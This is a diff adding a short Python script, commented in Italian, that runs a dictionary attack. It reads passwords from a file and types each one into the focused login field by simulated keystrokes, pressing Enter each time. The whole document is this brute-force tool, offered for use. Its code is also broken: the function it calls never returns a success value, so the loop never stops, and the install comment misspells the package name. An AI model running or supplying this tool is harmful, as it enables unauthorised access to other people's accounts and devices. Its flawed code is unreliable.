@@ -1,0 +1,24 @@
+#dicktionary attack fatto bene ;)
+#per installare la libreria keyboard:sudo pip3 install kayboard
+
+from ast import Pass
+import keyboard, time
+    
+passfile=input('File contenente le password da testare: ')
+time.sleep(2)
+def hit(Pass):
+    print("Sto provando la password:",Pass)
+    keyboard.write(Pass)
+    cont = (len(Pass)) #conta di quanti caratteri è formata la password per poterli cancellare
+    keyboard.press_and_release("Enter")
+    time.sleep(0.7)
+    a = cont + 2
+    for i in range(a):
+        keyboard.press_and_release("Delete")
+
+f=open(passfile)
+for i in f:
+    if(hit(i)):
+        break
+
+input()
